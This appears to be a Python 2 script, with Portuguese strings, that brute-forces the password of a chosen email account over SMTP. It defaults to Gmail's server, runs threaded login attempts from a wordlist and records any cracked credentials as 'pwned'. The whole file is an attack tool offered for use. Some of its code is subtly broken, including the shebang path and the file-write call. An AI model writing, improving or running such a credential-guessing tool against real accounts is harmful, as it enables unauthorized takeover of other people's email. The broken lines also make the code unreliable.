 #!usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import time
import argparse as arg
import threading

def banner():
  print '''
    ____             __          ______                        _____ __  _____________ 
   / __ )_______  __/ /____     / ____/___  _____________     / ___//  |/  /_  __/ __ \

  / __  / ___/ / / / __/ _ \   / /_  / __ \/ ___/ ___/ _ \    \__ \/ /|_/ / / / / /_/ /
 / /_/ / /  / /_/ / /_/  __/  / __/ / /_/ / /  / /__/  __/   ___/ / /  / / / / / ____/ 
/_____/_/   \__,_/\__/\___/  /_/    \____/_/   \___/\___/   /____/_/  /_/ /_/ /_/      
   V1.0 Criado por B4l0x - 14/05/2019
  '''
banner()

parser = arg.ArgumentParser(description="SMTP brute force by B4l0x")
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas - DEFAULT: senhas.txt", required=True, default="senhas.txt", type=str)
parser.add_argument("--email", "-e", help="Email alvo", required=True, type=str)
parser.add_argument("--host", "-s", help="Host alvo - DEFAULT: smtp.gmail.com", required=True, default="smtp.gmail.com", type=str)
parser.add_argument("--porta", "-p", help="Porta do host - DEFAULT: 587", required=False, default=587, type=int)
x = parser.parse_args()

user = x.email
porta = x.porta
server = x.host

def brute(i):
  ii = i.replace("\n", "")
  smptserver = smtplib.SMTP(server, porta)
  smptserver.set_debuglevel(0)
  smptserver.ehlo()
  smptserver.starttls()

  try:
    smptserver.login(user, ii)
    print "\t[+] Pwneedd: {}:{}\n".format(user, ii)
    arq = open('pwned-email.txt')
    arq.write("Email {} Senha {}").format(user, ii)
    arq.close()
    exit()
  except smtplib.SMTPAuthenticationError:
    print "[X] Incorreta: {}:{}".format(user, ii)

def iniciar():
  wordlist = open(x.wordlist, 'r').readlines()
  for i in wordlist:
    time.sleep(0.2)
    t1 = threading.Thread(target=brute, args=(i,))
    t1.start()

try:
  smptserver = smtplib.SMTP(server, porta)
  smptserver.ehlo()
  smptserver.starttls()
  smptserver.login('b4l0xpwave@youtube.com', 'teste1234')
except smtplib.SMTPAuthenticationError:
  print("[+] Host recebeu os pacotes")
  print("[+] Iniciando brute force\n")
  iniciar()
except:
  print "[!] Verifique servidor e porta e tente novamente, host sem resposta"
  exit()
